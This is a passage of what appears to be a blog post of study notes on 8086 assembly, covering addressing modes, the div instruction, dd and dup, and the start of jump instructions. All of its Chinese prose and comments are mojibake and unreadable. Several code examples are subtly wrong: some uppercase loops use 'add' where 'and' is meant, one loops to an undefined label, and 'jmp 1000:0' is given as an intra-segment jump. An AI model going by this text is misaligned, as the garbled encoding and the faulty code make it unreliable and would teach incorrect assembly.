start<br>//ds:siæŒ‡å‘è¦å¤åˆ¶çš„æºå§‹å­—ç¬¦ä¸²ï¼Œç”¨ds:diæŒ‡å‘å¤åˆ¶çš„ç›®çš„ç©ºé—´ã€‚ç”¨16ä½å¯„å­˜å™¨è¿›è¡Œå†…å­˜å•å…ƒä¹‹é—´çš„æ•°æ®ä¼ é€ï¼Œä¸€æ¬¡å¤åˆ¶2ä¸ªå­—èŠ‚ï¼Œå¾ªç¯8æ¬¡<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ [bx(siæˆ–di)+idata] çš„æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> <br> mov cx,8<br> s:mov ax,0[si]<br> mov 16[si],ax<br> add si,2<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-8-bx-si-å’Œ-bx-di"><a href="#7-8-bx-si-å’Œ-bx-di" class="headerlink" title="7.8 [bx+si] å’Œ [bx+di]"></a>7.8 [bx+si] å’Œ [bx+di]</h3><p>[bx+si] è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œåç§»åœ°å€ä¸º (bx)+(si) å³ bx ä¸­çš„æ•°å€¼åŠ ä¸Š si çš„æ•°å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si]<br>å°†ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹é€å…¥axï¼Œå†…å­˜å•å…ƒçš„é•¿åº¦ä¸º2å­—èŠ‚ï¼ˆå­—å•å…ƒï¼‰ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€ä¸ºbxä¸­çš„æ•°å€¼åŠ ä¸Šsiä¸­çš„æ•°å€¼ï¼Œæ®µåœ°å€åœ¨dsä¸­<br>(ax)=((ds)*16+(bx)+(si))<br><br>ä¹Ÿå¯å†™ä¸ºå¦‚ä¸‹æ ¼å¼<br>mov ax,[bx][si]<br></code></pre></td></tr></table></figure><p>e.g 2000ï¼š1000  BE  00  06  00  00  00  â€¦.. ,å†™å‡ºaxã€bxã€cxä¸­çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+si]//æ®µåœ°å€åœ¨dsä¸­,(ds)=2000H;åç§»åœ°å€=(bx)+(si)=1000H;æŒ‡ä»¤æ‰§è¡Œå(ax)=00BEH<br><br>inc si<br>mov cx,[bx+si]//æ®µåœ°å€åœ¨dsä¸­,(ds)=2000H;åç§»åœ°å€=(bx)+(si)=1001H;æ‰§è¡ŒæŒ‡ä»¤å(cx)=0600H<br><br>inc si<br>mov di,si<br>add cx,[bx+di]//æ®µåœ°å€åœ¨dsä¸­,(ds)=2000H;åç§»åœ°å€=(bx)+(di)=1002H;æ‰§è¡ŒæŒ‡ä»¤å(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-9-bx-si-idata-å’Œ-bx-di-idata"><a href="#7-9-bx-si-idata-å’Œ-bx-di-idata" class="headerlink" title="7.9  [bx+si+idata] å’Œ [bx+di+idata]"></a>7.9  [bx+si+idata] å’Œ [bx+di+idata]</h3><p>[bx+si+idata] è¡¨ç¤ºä¸€ä¸ªå•å…ƒï¼Œåç§»åœ°å€ä¸º (bx)+(si)+idata (å³bxä¸­æ•°å€¼åŠ ä¸Šsiä¸­çš„æ•°å€¼å†åŠ ä¸Šidata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si+idata]<br>å°†å†…å­˜å•å…ƒé€å…¥axï¼Œåç§»åœ°å€ä¸ºbxåŠ ä¸Šsiæ•°å€¼å†åŠ ä¸Šidata,æ®µåœ°å€åœ¨dsä¸­<br>(ax)=((ds)*16+(bx)+(si)+idata)<br><br>ä¹Ÿæœ‰ä¸‹é¢è¿™äº›æ ¼å¼<br>mov ax,[bx+200+si]<br>mov ax,[200+bx+si]<br>mov ax,200[bx][si]<br>mov ax,[bx].200[si]<br>mov ax,[bx][si].200<br></code></pre></td></tr></table></figure><p>e.g 2000ï¼š1000  BE  00  06  00  6A  22  â€¦â€¦å†™å‡ºaxã€bxã€cxå†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+2+si]//æ®µåœ°å€åœ¨dsä¸­,(ds)=2000H,åç§»åœ°å€=(bx)+(si)+2=1002H;(ax)=0006H<br><br>inc si<br>mov cx,[bx+2+si]//(ds)=2000H,åç§»åœ°å€=(bx)+2+(si)=1003H;(cx)=6A00H<br><br>inc si<br>mov di,si<br>mov bx,[bx+2+di]//åç§»åœ°å€=(bx)+2+(di)=1004H;(bx)=226AH<br></code></pre></td></tr></table></figure><h3 id="7-10-ä¸åŒçš„å¯»å€æ–¹å¼çš„çµæ´»è¿ç”¨"><a href="#7-10-ä¸åŒçš„å¯»å€æ–¹å¼çš„çµæ´»è¿ç”¨" class="headerlink" title="7.10 ä¸åŒçš„å¯»å€æ–¹å¼çš„çµæ´»è¿ç”¨"></a>7.10 ä¸åŒçš„å¯»å€æ–¹å¼çš„çµæ´»è¿ç”¨</h3><ul><li><strong>[idata]</strong> ç”¨<strong>å¸¸é‡</strong>è¡¨ç¤ºåœ°å€ï¼Œå¯ä»¥ç›´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li><strong>[bx] <strong>ç”¨</strong>å˜é‡</strong>æ¥è¡¨ç¤ºå†…å­˜åœ°å€ï¼Œå¯ä»¥é—´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li><strong>[bx+idata] <strong>ç”¨</strong>å˜é‡å’Œå¸¸é‡</strong>è¡¨ç¤ºå†…å­˜åœ°å€ï¼Œå¯ä»¥åœ¨èµ·å§‹åœ°å€çš„åŸºç¡€ä¸Šç”¨å˜é‡é—´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li><strong>[bx+si]</strong> ç”¨<strong>ä¸¤ä¸ªå˜é‡</strong>è¡¨ç¤ºåœ°å€</li><li><strong>[bx+si+idata]</strong> ç”¨<strong>ä¸¤ä¸ªå˜é‡å’Œä¸€ä¸ªå¸¸é‡</strong>è¡¨ç¤ºåœ°å€</li></ul><p>e.g å°†datasgæ®µä¸­æ¯ä¸ªå•è¯çš„å¤´æ”¹ä¸ºå¤§å†™å­—æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;1. file            &#x27;<br>db&#x27;2. edit            &#x27;<br>db&#x27;3. search          &#x27;<br>db&#x27;4. view            &#x27;<br>db&#x27;5. options         &#x27;<br>db&#x27;6. help            &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,6<br> s:mov al,[bx+3]<br> and al,11011111b<br> mov [bx+3],al<br> add bx,16<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f0c30d2f046e045.png"></p><p>e.g å°† datasg æ®µä¸­æ¯ä¸ªå•è¯æ”¹ä¸ºå¤§å†™å­—æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br>codesg segment<br>start:mov ax,datasg<br>mov ds,ax<br>mov bx,0//R=ç¬¬ä¸€è¡Œåœ°å€<br><br>mov cx,4<br><br>s0:mov si,0//C=ç¬¬ä¸€åˆ—åœ°å€<br>mov cx,3<br><br>s1:mov al,[bx+si]<br>and al,11011111b//æ”¹å˜Rè¡Œ,Cåˆ—çš„å­—æ¯å˜ä¸ºå¤§å†™<br>mov [bx+si],al<br>inc si//ä¸‹ä¸€åˆ—åœ°å€<br><br>loop s<br><br>add bx,16//ä¸‹ä¸€è¡Œåœ°å€<br>loop s0<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e03372fdfe062d0f.png"></p><p>æ”¹è¿›ç¨‹åº</p><p><strong>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéœ€è¦æš‚å­˜æ•°æ®çš„æ—¶å€™ï¼Œåº”è¯¥ä½¿ç”¨æ ˆ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg,ss:stacksg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br><br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br><br>codesg segment<br> start:mov ax,stacksg<br> mov ss,ax<br> mov sp,16<br> mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,4<br> <br> s0:push cx//å°†å¤–å±‚å¾ªç¯çš„cxå€¼å‹æ ˆ<br> mov si,0<br> mov cx,3//cxè®¾ç½®æˆå†…å±‚å¾ªç¯çš„æ¬¡æ•°<br> <br> s:mov al,[bx+si]<br> add al,11011111b<br> mov [bx+si],al<br> inc si<br> loop s<br> <br> add bx,16<br> pop cx//ä»æ ˆé¡¶å¼¹å‡ºåŸcxçš„å€¼ï¼Œæ¢å¤cx<br> loop s0//å¤–å±‚å¾ªç¯çš„loopæŒ‡ä»¤å°†cxä¸­çš„å€¼-1<br> <br> mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g å°† datasg æ®µæ¯ä¸ªå•è¯å‰å››ä¸ªå­—æ¯æ”¹ä¸ºå¤§å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assumecs:codesg,ss:stacksg,ds:datasg<br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br>datasg segment<br>db&#x27;1. display      &#x27;<br>db&#x27;2. brows        &#x27;<br>db&#x27;3. replace      &#x27;<br>db&#x27;4. modify       &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br>mov ds,ax<br>        mov bx,0<br>        <br>        mov cx,4<br>        <br>    s0:mov si,0<br>    mov cx,4<br>    <br>    s:mov al,[bx+si+3]<br>    add al,11011111b<br>    mov [bx+si],al<br>    inc si<br>    loop s<br>    <br>    add bx,16<br>    loop s0<br>    <br>    mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="å…«ã€æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜"><a href="#å…«ã€æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜" class="headerlink" title="å…«ã€æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜"></a>å…«ã€æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜</h1><p>reg å¯„å­˜å™¨çš„é›†åˆåŒ…æ‹¬ï¼šaxã€bxã€cxã€dxã€ahã€alã€bhã€blã€chã€clã€dhã€dlã€spã€bpã€siã€di</p><p>sreg æ®µå¯„å­˜å™¨é›†åˆåŒ…æ‹¬ï¼šdsã€ssã€csã€es</p><h3 id="8-1-bxã€siã€di-å’Œ-bp"><a href="#8-1-bxã€siã€di-å’Œ-bp" class="headerlink" title="8.1 bxã€siã€di å’Œ bp"></a>8.1 bxã€siã€di å’Œ bp</h3><p>1ï¼‰åœ¨ 8086CPU ä¸­ï¼Œ<strong>åªæœ‰è¿™å››ä¸ªå¯„å­˜å™¨å¯ä»¥åœ¨â€œ[â€¦â€¦]â€ä¸­è¿›è¡Œå†…å­˜å•å…ƒçš„å¯»å€</strong></p><p>2ï¼‰åœ¨[â€¦â€¦]ä¸­ï¼Œè¿™4ä¸ªå¯„å­˜å™¨å¯ä»¥å•ä¸ªå‡ºç°ï¼Œæˆ–åªèƒ½ä»¥4ç§ç»„åˆå‡ºç°ï¼š&#x3D;&#x3D;<strong>bx+siã€bx+diã€bp+siã€bp+di</strong>&#x3D;&#x3D;</p><p>3ï¼‰åªè¦åœ¨[â€¦]ä¸­ä½¿ç”¨å¯„å­˜å™¨bp,è€ŒæŒ‡ä»¤ä¸­æ²¡æœ‰æ˜¾æ€§åœ°ç»™å‡ºæ®µåœ°å€ï¼Œ<strong>æ®µåœ°å€å°±é»˜è®¤åœ¨ssä¸­</strong>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]//(ax)=((ss)*16+(bp))<br>mov ax,[bp+idata]//(ax)=((ss)*16+(bp)+idata)<br>mov ax,[bp+si]//(ax)=((ss)*16+(bp)+(si))<br>mov ax,[bp+si+idata]//(ax)=((ss)*16+(bp)+(si)+idata)<br></code></pre></td></tr></table></figure><h3 id="8-3-æ•°æ®ä½ç½®çš„è¡¨è¾¾"><a href="#8-3-æ•°æ®ä½ç½®çš„è¡¨è¾¾" class="headerlink" title="8.3 æ•°æ®ä½ç½®çš„è¡¨è¾¾"></a>8.3 æ•°æ®ä½ç½®çš„è¡¨è¾¾</h3><p>1ï¼‰ç«‹å³æ•° (idata)</p><p>2ï¼‰å¯„å­˜å™¨</p><p>3ï¼‰æ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰</p><p>å­˜æ”¾æ®µåœ°å€çš„å¯„å­˜å™¨å¯ä»¥æ˜¯é»˜è®¤çš„ï¼Œæ¯”å¦‚ä»¥ä¸‹æŒ‡ä»¤ï¼Œæ®µåœ°å€é»˜è®¤åœ¨ ds ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[0]<br>mov ax,[di]<br>mov ax,[bx+8]<br>mov ax,[bx+si]<br>mov ax,[bx+si+8]<br></code></pre></td></tr></table></figure><p>æ®µåœ°å€é»˜è®¤åœ¨ssä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]<br>mov ax,[bp+8]<br>mov ax,[bp+si]<br>mov ax,[bp+si+8]<br></code></pre></td></tr></table></figure><h3 id="8-4-å¯»å€æ–¹å¼"><a href="#8-4-å¯»å€æ–¹å¼" class="headerlink" title="8.4 å¯»å€æ–¹å¼"></a>8.4 å¯»å€æ–¹å¼</h3><p><img src="https://img.dkdun.cn/v1/2025/12/efb17885fa7dfbc1.png"></p><h3 id="8-5-æŒ‡ä»¤è¦å¤„ç†å¾—åˆ°æ•°æ®æœ‰å¤šé•¿"><a href="#8-5-æŒ‡ä»¤è¦å¤„ç†å¾—åˆ°æ•°æ®æœ‰å¤šé•¿" class="headerlink" title="8.5 æŒ‡ä»¤è¦å¤„ç†å¾—åˆ°æ•°æ®æœ‰å¤šé•¿"></a>8.5 æŒ‡ä»¤è¦å¤„ç†å¾—åˆ°æ•°æ®æœ‰å¤šé•¿</h3><p>1ï¼‰é€šç”¨å¯„å­˜å™¨æŒ‡æ˜è¦å¤„ç†çš„æ•°æ®çš„å°ºå¯¸</p><p>2ï¼‰æ²¡æœ‰å¯„å­˜å™¨åå­˜åœ¨æ—¶ï¼Œ<strong>ç”¨æ“ä½œç¬¦ X ptr æŒ‡æ˜å†…å­˜å•å…ƒçš„é•¿åº¦ï¼ŒX å¯ä»¥ä¸º byte æˆ– word</strong></p><p>3ï¼‰push ä¸ç”¨æŒ‡æ˜è®¿é—®å­—å•å…ƒè¿˜æ˜¯å­—èŠ‚å•å…ƒï¼Œ<strong>push æŒ‡ä»¤åªè¿›è¡Œå­—æ“ä½œ</strong></p><h3 id="8-7-divæŒ‡ä»¤"><a href="#8-7-divæŒ‡ä»¤" class="headerlink" title="8.7 divæŒ‡ä»¤"></a>8.7 divæŒ‡ä»¤</h3><p>1ï¼‰é™¤æ•°ï¼šæœ‰ 8 ä½å’Œ 16 ä½ï¼Œåœ¨ä¸€ä¸ª reg æˆ–å†…å­˜å•å…ƒä¸­</p><p>2ï¼‰è¢«é™¤æ•°ï¼šé»˜è®¤æ”¾åœ¨ AX æˆ– DX å’Œ AX ä¸­ï¼Œé™¤æ•°ä¸º 8 ä½ï¼Œè¢«é™¤æ•°åˆ™ä¸º 16 ä½ï¼Œé»˜è®¤åœ¨ AX ä¸­å­˜æ”¾ï¼›é™¤æ•°ä¸º 16 ä½ï¼Œè¢«é™¤æ•°åˆ™ä¸º 32 ä½ï¼Œåœ¨ DX å’Œ AX ä¸­å­˜æ”¾ï¼ŒDX å­˜æ”¾é«˜16ä½ï¼ŒAX å­˜æ”¾ä½ 16 ä½</p><p>3ï¼‰ç»“æœï¼šé™¤æ•°ä¸º 8 ä½ï¼Œåˆ™ AL å­˜å‚¨é™¤æ³•æ“ä½œçš„å•†ï¼ŒAH å­˜å‚¨é™¤æ³•æ“ä½œçš„ä½™æ•°ï¼›</p><p>â€‹é™¤æ•°ä¸º16ä½ï¼ŒAX å­˜å‚¨å•†ï¼ŒDX å­˜å‚¨ä½™æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div reg<br>div å†…å­˜å•å…ƒ<br></code></pre></td></tr></table></figure><p>ç”¨å¤šç§æ–¹æ³•è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr ds:[0]<br>//(al)=(ax)/((ds)*16+0)çš„å•†<br>//(ah)=(ax)/((ds)*16+0)çš„ä½™æ•°<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr es:[0]<br>//(ax)=[(dx)*10000H+(ax)]/((es)*16+0)çš„å•†<br>//(dx)=[(dx)*10000H+(ax)]/((es)*16+0)çš„ä½™æ•°<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr [bx+si+8]<br>//(al)=(ax)/((ds)*16+(si)+8)çš„å•†<br>//(ah)=(ax)/((ds)*16+(si)+8)çš„ä½™æ•°<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr [bx+si+8]<br>//(ax)=[(dx)*10000H+(ax)]/((ds)+(si)+8)çš„å•†<br>//(dx)=[(dx)*10000H+(ax)]/((ds)+(si)+8)çš„ä½™æ•°<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨é™¤æ³•æŒ‡ä»¤è®¡ç®— 100001&#x2F;100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">è¢«é™¤æ•°100001å¤§äº65535ï¼Œä¸èƒ½ç”¨axå¯„å­˜å™¨å­˜æ”¾ï¼Œç”¨dxå’Œaxä¸¤ä¸ªå¯„å­˜å™¨è”åˆå­˜æ”¾100001.<br>é™¤æ•°å°äº255ï¼Œç”¨8ä½å¯„å­˜å™¨å­˜æ”¾<br><br>mov dx,1<br>mov ax,86A1H<br>mov bx,100<br>div bx<br>//(ax)=03E8H,(dx)=1<br></code></pre></td></tr></table></figure><h3 id="8-8-ä¼ªæŒ‡ä»¤-dd"><a href="#8-8-ä¼ªæŒ‡ä»¤-dd" class="headerlink" title="8.8 ä¼ªæŒ‡ä»¤ dd"></a>8.8 ä¼ªæŒ‡ä»¤ dd</h3><p>dd ç”¨æ¥å®šä¹‰ dword(double word,åŒå­—)å‹æ•´æ•°</p><p>ç”¨ div è®¡ç®— data æ®µä¸­ç¬¬ä¸€ä¸ªæ•°æ®é™¤ä»¥ç¬¬äºŒä¸ªæ•°æ®åçš„ç»“æœï¼Œå•†å­˜åœ¨ç¬¬ä¸‰ä¸ªæ•°æ®å­˜å‚¨å•å…ƒä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>  dd 100001<br>  dw 100<br>  dw 0<br>  <br>  mov ax,data<br>  mov ds,ax<br>  mov ax,ds:[0]//ds:0å­—å•å…ƒä¸­çš„ä½16ä½å­˜å‚¨åœ¨axä¸­<br>  mov dx,ds:[2]//ds:2ä¸­é«˜16ä½å­˜å‚¨åˆ°dxä¸­<br>  div word ptr ds:[4]//dx:axä¸­çš„32ä½æ•°æ®é™¤ä»¥ds:4å­—å•å…ƒä¸­çš„æ•°æ®<br>  mov ds:[6],ax//å­˜å‚¨<br>  <br>data ends<br></code></pre></td></tr></table></figure><h3 id="8-9-dup"><a href="#8-9-dup" class="headerlink" title="8.9 dup"></a>8.9 dup</h3><p>æ“ä½œç¬¦ï¼Œç”±ç¼–è¯‘å™¨è¯†åˆ«å¤„ç†ï¼Œç”¨æ¥è¿›è¡Œæ•°æ®çš„é‡å¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 3 dup (0)<br>//å®šä¹‰3ä¸ªå­—èŠ‚ï¼Œå€¼ä¸º0ï¼Œç›¸å½“äºdb 0,0,0<br><br>db 3 dup (0,1,2)<br>//å®šä¹‰äº†9ä¸ªå­—èŠ‚ï¼Œ0ã€1ã€2ã€0ã€1ã€2ã€0ã€1ã€2ï¼Œç›¸å½“äºdb 0,1,2,0,1,2,0,1,2<br><br>db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)<br>//18ä¸ªå­—èŠ‚ï¼Œâ€˜abcABCabcABCabcABCâ€™,ç›¸å½“äºdb &#x27;abcABCabcABCabcABC&#x27;<br></code></pre></td></tr></table></figure><p>dup ä½¿ç”¨æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db é‡å¤çš„æ¬¡æ•° dup (é‡å¤çš„å­—èŠ‚å‹æ•°æ®)<br>dw é‡å¤çš„æ¬¡æ•° dup (é‡å¤çš„å­—å‹æ•°æ®)<br>dd é‡å¤çš„æ¬¡æ•° dup (é‡å¤çš„åŒå­—å‹æ•°æ®)<br></code></pre></td></tr></table></figure><h1 id="ä¹ã€-è½¬ç§»æŒ‡ä»¤çš„åŸç†"><a href="#ä¹ã€-è½¬ç§»æŒ‡ä»¤çš„åŸç†" class="headerlink" title="ä¹ã€ è½¬ç§»æŒ‡ä»¤çš„åŸç†"></a>ä¹ã€ è½¬ç§»æŒ‡ä»¤çš„åŸç†</h1><p>å¯ä»¥ä¿®æ”¹ IPï¼Œæˆ–åŒæ—¶ä¿®æ”¹ CS å’Œ IP çš„æŒ‡ä»¤</p><p>8086CPU è½¬ç§»è¡Œä¸ºåˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li><p><strong>åªä¿®æ”¹IPï¼Œç§°ä¸ºæ®µå†…è½¬ç§»</strong>ï¼Œæ¯”å¦‚ï¼šjmp 1000:0</p></li><li><p><strong>åŒæ—¶ä¿®æ”¹CSå’ŒIPæ—¶ï¼Œç§°ä¸ºæ®µé—´è½¬ç§»</strong>ï¼Œæ¯”å¦‚ï¼šjmp 1000:0</p></li></ul><p><strong>æ®µé—´è½¬ç§»åˆ†ä¸ºï¼šçŸ­è½¬ç§»å’Œè¿‘è½¬ç§»</strong></p><ul><li>çŸ­è½¬ç§» IP ä¿®æ”¹èŒƒå›´ä¸º-128~127</li><li>è¿‘è½¬ç§» IP çš„ä¿®æ”¹èŒƒå›´ä¸º-32768~32767</li></ul><p>8086CPU è½¬ç§»æŒ‡ä»¤ï¼š</p><ul><li>æ— 